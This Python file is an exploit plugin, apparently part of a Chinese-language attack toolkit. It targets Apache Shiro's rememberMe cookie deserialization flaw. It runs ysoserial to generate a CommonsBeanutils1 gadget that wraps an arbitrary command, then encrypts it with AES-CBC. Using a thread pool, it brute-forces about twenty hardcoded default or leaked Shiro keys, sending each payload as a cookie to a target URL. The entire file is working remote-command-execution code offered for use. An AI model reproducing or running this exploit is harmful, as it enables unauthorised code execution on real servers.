# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import threadpool
from Crypto.Cipher import AES
from ..main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class1:CommonsBeanutils1')
class CommonsBeanutils1(object):
    def process(self,url,command, thre):
        self.poc(url,command, thre)
        
    def generator(self, String, fp=JAR_FILE):

        key_rule = re.compile('(.*?)1234url3456')
        url_rule = re.compile('1234url3456(.*?)1234command3456')
        command_rule = re.compile('1234command3456(.*?)1234sven3456')



        key = key_rule.findall(String)[0]
        target = url_rule.findall(String)[0]
        command = command_rule.findall(String)[0]

        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
                                    stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        file_body = pad(popen.stdout.read())         #受popen影响的file_body
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
            }
        try:
            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(r.status_code==200):
                print("[+]   CommonsBeanutils1模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   CommonsBeanutils1模块   key: {} 发送异常！\n[-]   状态码:{}".format(str(key),str(r.status_code)))
        except Exception as e:
            print(e) 
        return False

    def multithreading(self,funcname,url ,command, pools):

        key = ['kPH+bIxk5D2deZiIxcaaaA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456','2AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','4AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '3AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','Z3VucwAAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','U3ByaW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '6ZmI6I2j5Y+R5aSn5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','fCq+/xW488hMTCD+cmJ3aQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','1QWLxg+NYmxraMoxAXu/Iw==1234url3456'+url+'1234command3456'+command+'1234sven3456','ZUdsaGJuSmxibVI2ZHc9PQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            'L7RioUULEFhRyxM7a2R/Yg==1234url3456'+url+'1234command3456'+command+'1234sven3456','r0e3c16IdVkouZgk1TKVMg==1234url3456'+url+'1234command3456'+command+'1234sven3456','5aaC5qKm5oqA5pyvAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWluZS1hc3NldC1rZXk6QQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            'a2VlcE9uR29pbmdBbmRGaQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','WcfHGU25gNnTxTlmJMeSpw==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWljcm9zAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','MTIzNDU2Nzg5MGFiY2RlZg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '5AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456']

        pool = threadpool.ThreadPool(pools)
        requests = threadpool.makeRequests(funcname,key)
        [pool.putRequest(req) for req in requests]
        pool.wait()
    def poc(self,url, command, thre):

        self.multithreading(self.generator, url, command, thre)
        return False


